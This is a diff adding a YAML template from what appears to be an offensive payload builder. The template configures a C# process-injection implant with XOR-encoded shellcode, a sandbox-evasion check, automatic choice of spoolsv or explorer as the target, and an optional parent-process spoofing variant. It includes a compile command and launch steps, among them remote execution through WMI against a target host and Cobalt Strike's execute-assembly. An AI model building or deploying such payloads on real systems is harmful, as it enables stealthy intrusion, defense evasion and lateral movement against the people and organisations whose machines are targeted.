@@ -1,0 +1,85 @@
+recipe_type: "template"
+
+name: "Process Injection - C# .NET"
+description: |
+  Process injection using C# with P/Invoke to call Win32 APIs.
+  Includes sandbox evasion (VirtualAllocExNuma check) and XOR-encoded shellcode.
+  Automatically selects target process based on privileges (spoolsv if admin, explorer if user).
+  
+  Medium-high effectiveness with built-in evasion techniques.
+
+mitre:
+  tactic: "TA0005 - Defense Evasion"
+  technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"
+
+effectiveness: "high"
+
+artifacts:
+  - ".NET assembly execution (.exe or in-memory)"
+  - "Memory allocation in remote process with RWX permissions"
+  - "CreateRemoteThread API calls"
+  - "VirtualAllocExNuma sandbox check (distinctive pattern)"
+  - "Sysmon Event ID 8 (CreateRemoteThread)"
+  - "Sysmon Event ID 10 (ProcessAccess)"
+  - "Sysmon Event ID 7 (ImageLoad) for .NET CLR"
+
+parameters:
+  - name: "target_process"
+    type: "string"
+    description: "Target process name (leave empty for auto-select based on privileges)"
+    required: false
+    default: ""
+
+  - name: "shellcode_file"
+    type: "file"
+    description: "Path to raw shellcode binary"
+    required: true
+    example: "./shellcode.bin"
+
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR encryption key (2 hex digits)"
+    required: false
+    auto_generate: true
+    default: "fa"
+
+  - name: "output_dir"
+    type: "path"
+    description: "Directory to save compiled payload"
+    required: true
+    default: "./output"
+
+sub_recipes:
+  - name: "Standalone Executable"
+    description: "Compile as standalone .exe (includes XOR decryption)"
+    source_template: "payloads/process_injection/process_injection.cs"
+    preprocessing:
+      - type: "xor_encrypt"
+        input: "shellcode_file"
+        key: "xor_key"
+
+  - name: "With PPID Spoofing"
+    description: "Spoof parent process ID for stealthier execution"
+    source_template: "payloads/process_injection/process_injection_ppid.cs"
+    preprocessing:
+      - type: "xor_encrypt"
+        input: "shellcode_file"
+        key: "xor_key"
+
+output:
+  type: "file"
+  filename_pattern: "process_injection_{timestamp}.exe"
+  compile_command: "csc /target:exe /out:{{ output_dir }}/{{ output_filename }} {{ source_file }}"
+
+launch_instructions: |
+  # Execute directly:
+  {{ output_filename }}
+  
+  # Or with specific target process:
+  {{ output_filename }} notepad
+  
+  # Remote execution via WMI:
+  wmic /node:{{ target_host }} /user:{{ username }} process call create "{{ output_filename }}"
+  
+  # Execute-Assembly (Cobalt Strike):
+  execute-assembly {{ output_filename }}
